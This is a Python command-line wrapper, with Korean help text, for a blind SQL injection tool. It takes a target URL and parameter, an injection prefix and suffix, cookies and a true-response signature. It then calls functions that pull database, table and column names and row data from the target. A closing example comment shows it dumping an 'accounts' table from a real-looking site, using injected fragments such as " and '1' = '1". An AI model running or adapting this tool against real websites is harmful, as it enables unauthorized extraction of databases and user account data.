from bliend_sqli import Bliend_sqli
import argparse




parser = argparse.ArgumentParser(description= "Bliend SQLi Tool")

req = parser.add_argument_group("필수 옵션", "반드시 작성해야하는 옵션입니다.")
sel = parser.add_argument_group("선택옵션", "초기값이 있는 옵션들 입니다.")


sel.add_argument("-d", "--database", help = "데이터베이스명 지정. 초기값은 사용중인 DB")
req.add_argument("-t", "--table", help = "테이블명 지정", nargs = "+")
sel.add_argument("-c", "--column", help = "컬럼명 지정", nargs = "+")

req.add_argument("execution", help = "실행할 옵션(db, table, column, data)")
req.add_argument("-u", "--url", help = "URL 주소", required = True)
req.add_argument("-q", "--query", help = "URL 쿼리 파라미터", required = True)
req.add_argument("-sign", "--signature", help = "True의 시그니처 지정", required = True)


sel.add_argument("-s", "--starter", help = "여는 SQL문. 초기값 ' and ", default = "' and ")
sel.add_argument("-e", "--ender", help = "닫는 SQL문. 초기값 #", default = "#")
sel.add_argument("-ck", "--cookie", help = "쿠키값 지정.")
sel.add_argument("-m", "--method", help = "HTTP 메서드 지정. (G)/P", default = "G")
sel.add_argument("-l", "--lim", help = "데이터 갯수 제한")



args = parser.parse_args()

if args.cookie and len(args.cookie)>0:
    cookie = {}
    for i in args.cookie:
        ck = i.split(":")
        cookie[ck[0]] = ck[1]
else:
    cookie = {}

print(args)



bsqli = Bliend_sqli(args.url, args.query, args.signature, sql_starter = args.starter, sql_ender = args.ender, cookie = cookie, req = args.method)
#, cookie = cookie, req = args.method

if args.execution == "db":
    print(bsqli.db_name_func())
elif args.execution == "table":
    table = bsqli.table_name_function(args.database)
elif args.execution == "column":
    column = bsqli.column_name_func(args.table, args.database)
    print(column)
elif args.execution == "data":
    data = bsqli.db_data_func(args.table, args.column, args.database, args.lim)
    print(data)


#######################
#EX
#-u http://nk.iqsp.com/nk/conent.php -t accounts -q id -s "131' and" -sign Hacked -e " and '1' = '1" data
#######################

